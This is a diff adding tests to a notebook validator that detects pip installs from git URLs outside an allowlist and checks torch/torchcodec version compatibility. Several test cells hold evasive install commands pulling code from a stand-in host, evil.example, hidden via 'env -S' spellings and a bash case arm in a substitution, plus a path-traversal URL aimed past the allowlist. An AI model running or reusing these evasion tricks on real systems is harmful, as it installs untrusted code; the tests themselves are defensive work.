@@ -2904,3 +2904,97 @@ def test_builtin_is_not_an_exec_prefix():
     # The prefixes that really do run the command after them are untouched.
     for prefix in ("command", "exec", "nohup", "time", "sudo"):
         assert nv._strip_exec_prefixes(f"{prefix} pip install x") == ("pip install x", True), prefix
+
+
+def test_env_split_string_is_read_in_its_attached_form():
+    """`-S` takes a mandatory operand, so `env -S'pip install' pkg` is valid and runs pip.
+
+    Exact membership recognised only the detached `-S STRING` and the `--split-string=STRING`
+    spellings, so the attached one yielded no invocation and R-INST-001 saw no install.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!env -S'pip install' git+https://evil.example/pkg.git",
+        '!env -S"pip install" git+https://evil.example/pkg.git',
+        "!env -Spip install git+https://evil.example/pkg.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # The detached spellings and the unrelated `-u NAME` operand still read as before.
+    assert nv._strip_exec_prefixes('env -S "pip install" x') == ("pip install x", True)
+    assert nv._strip_exec_prefixes("env -u PIP_INDEX_URL pip install x") == (
+        "pip install x",
+        True,
+    )
+
+
+def test_a_vcs_revision_is_split_from_the_right():
+    """pip takes the LAST `@` after the repo path as the revision delimiter.
+
+    Splitting at the first one read a traversal that resolves outside the allowlist as the
+    allowlisted repository, so R-INST-001 passed a clone of somewhere else entirely.
+    """
+    nv = _load_notebook_validator_module()
+
+    traversal = (
+        "!pip install git+https://github.com/unslothai/unsloth@fake/../../attacker/repo@main"
+    )
+    assert [f.rule for f in nv.rule_inst_001_git_plus(traversal, "nb.ipynb", 0)] == ["R-INST-001"]
+    # An ordinary allowlisted clone, with and without a revision, is still allowed.
+    for allowed in (
+        "!pip install git+https://github.com/unslothai/unsloth",
+        "!pip install git+https://github.com/unslothai/unsloth.git",
+        "!pip install git+https://github.com/unslothai/unsloth@main",
+        "!pip install git+https://github.com/unslothai/unsloth.git@nightly",
+    ):
+        assert nv.rule_inst_001_git_plus(allowed, "nb.ipynb", 0) == [], allowed
+
+
+def test_an_upgrade_re_resolves_a_constrained_requirement():
+    """`--upgrade` upgrades every named package to the newest available version.
+
+    An installed release that merely SATISFIES the range is therefore not where pip lands, and
+    reading it back raised a false R-INST-004 against a torch the window is compatible with.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
+    environment = nv._marker_environment(colab)
+
+    upgraded = '!pip install --upgrade "torchcodec>=0.10,<0.12"'
+    assert nv._effective_version(upgraded, "torchcodec", colab["torchcodec"], environment) == (
+        "0.11",
+        True,
+    )
+    assert nv.rule_inst_004_torchcodec_torch(upgraded, colab, "nb.ipynb", 0) == []
+    # Without --upgrade pip keeps a version that already satisfies the range.
+    assert nv._effective_version(
+        '!pip install "torchcodec>=0.10,<0.12"', "torchcodec", colab["torchcodec"], environment
+    ) == ("0.10.0+cu128", True)
+    # An exact pin still wins over the flag.
+    assert nv._effective_version(
+        '!pip install --upgrade "torchcodec==0.10.1"',
+        "torchcodec",
+        colab["torchcodec"],
+        environment,
+    ) == ("0.10.1", True)
+
+
+def test_a_case_arm_does_not_close_a_substitution():
+    """A `case` arm's pattern ends in an UNBALANCED `)`, which is not the substitution's.
+
+    Popping on it ended the body at `x)`, so the pip call bash really runs in
+    `$(case x in x) pip install ...;; esac)` was never scanned.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!echo $(case x in x) pip install git+https://evil.example/pkg.git;; esac)"
+    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
+    assert nv._substitution_bodies("echo $(case x in x) pip install a;; esac) tail") == [
+        "case x in x) pip install a;; esac"
+    ]
+    # An ordinary substitution, and a `)` inside a quoted word, still close where they did.
+    assert nv._substitution_bodies("echo $(pip install a) tail") == ["pip install a"]
+    assert nv._substitution_bodies('echo $(pip install "a)b")') == ['pip install "a)b"']
+    assert nv._substitution_bodies("echo $(pip install $(cat x)) tail") == ["pip install $(cat x)"]
